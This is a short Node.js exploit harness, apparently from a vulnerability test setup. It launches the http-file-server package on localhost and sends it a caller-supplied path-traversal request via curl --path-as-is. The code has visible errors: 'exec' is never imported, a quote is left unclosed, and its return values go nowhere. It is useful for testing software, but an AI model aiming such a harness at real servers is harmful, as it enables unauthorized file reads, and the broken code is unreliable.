function exploitFunction(payload) {
  const path = require("path");
  const { sleep } = require("sleep");
  const { execSync } = require("child_process");

  const { resolve } = path;  // Use the resolve function from the path module

  // Clean up any previous processes
  try {
    execSync("fuser -k 8080/tcp");
  } catch (e) {}

  let server = "node ./node_modules/http-file-server/http-file-server.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${payload()}`;  // Call the payload function
  exec(attack_string, (error, stdout) => {
    if (stdout) {
      console.log("Output:", stdout);
      return stdout;
    }
    return null;
  });
}

module.exports = { exploitFunction };